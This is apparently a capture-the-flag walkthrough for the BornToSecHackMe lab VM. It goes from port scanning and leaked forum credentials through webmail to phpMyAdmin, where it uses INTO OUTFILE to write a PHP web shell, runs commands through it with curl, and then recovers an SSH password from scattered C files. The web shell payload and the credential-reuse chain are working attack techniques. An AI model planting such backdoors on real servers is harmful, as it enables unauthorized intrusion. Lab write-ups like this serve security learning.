first we will use nmap to get the ip of the VM, and scan it's open ports.

![nmap](./nmap.png)

we can see multiple ports open, including a http server. opening the web page we are greeted by a simple useless static html page. instead we will use a tool (dirsearch here) to find http path based on a wordlist.

![dirsearch](./dirsearch.png)

we see there is a forum, a webmail, and a phpmyadmin.

let's see the forum.

there is only 4 posts. the only interesting is `Probleme login ? - lmezard` where he posted the log of his failed login.

scrolling through the logs, we can see at a point he mistakenly entered his password in the username field, which is not hidden: ` Oct 5 08:45:29 BornToSecHackMe sshd[7547]: Failed password for invalid user !q\]Ej?*5K5cy*AJ from 161.202.39.38 port 57764 ssh2`

we can try to connect to the multiples services, but the only that work is on the forum itself as the user `lmezard` with the password `!q\]Ej?*5K5cy*AJ`.

now we can access the account private informations, including it's email `laurie@borntosec.net` that we can use to connect to the webmail.

we can see a mail saying

> Hey Laurie,
>
> You cant connect to the databases now. Use root/Fg-'kKXBj87E:aJ$
>
> Best regards.

well now we can connect to the phpmyadmin instance, it's very useful as we can use it to write sql query, and mysql is able to write to a file using `INTO OUTFILE` command.

trying to write a simple command launcher into the http server directory `SELECT "<?php system($_GET['cmd']); ?>" into outfile "/var/www/backdoor.php"` fails. we need to find a location where we have write access.

maybe with the forum ? looking at the forum source code (mylittleforum) there is multiples directory, trying multiples we find `templates_c` where we can write the file.

so now we just have to access it: `curl --insecure https://vm/forum/templates_c/backdoor.php?cmd=whoami` and we are www-data as expected.

trying to find something, we can `ls` the `/home` dir and get `LOOKATME ft_root laurie laurie@borntosec.net lmezard thor zaz`

the only dir we can access is `LOOKATME`, where there a single `password` file with `lmezard:G!@M6f4Eatau{sF"` inside.

ssh don't work, but ftp does.

we can see two file, a readme with `Complete this little challenge and use the result as password for user 'laurie' to login in ssh` and a `fun` named file. using the `file` command we can see it's archive.

the archive is 750 .pcap files, but that are just text file and not packet captures.
each file seems to contain C code. a file contain the main function:

```c
int main() {
        printf("M");
        printf("Y");
        printf(" ");
        printf("P");
        printf("A");
        printf("S");
        printf("S");
        printf("W");
        printf("O");
        printf("R");
        printf("D");
        printf(" ");
        printf("I");
        printf("S");
        printf(":");
        printf(" ");
        printf("%c",getme1());
        printf("%c",getme2());
        printf("%c",getme3());
        printf("%c",getme4());
        printf("%c",getme5());
        printf("%c",getme6());
        printf("%c",getme7());
        printf("%c",getme8());
        printf("%c",getme9());
        printf("%c",getme10());
        printf("%c",getme11());
        printf("%c",getme12());
        printf("\n");
        printf("Now SHA-256 it and submit");
}
```

and some other files contain part of the getmeX function that return a char.
and most importantly, each file contain a comment like this `//file254` which probably indicate the order of the file.

to reconstruct the code we can write a simple script: `for i in {1..750}; do echo | cat $(rg -l "file$i$") - >> main.c; done`
then `cc main.c` and `./a.out`: `MY PASSWORD IS: Iheartpwnage
Now SHA-256 it and submit`
so `echo -n Iheartpwnage | sha256sum`: `330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4`
which allow us to ssh into the laurie user.
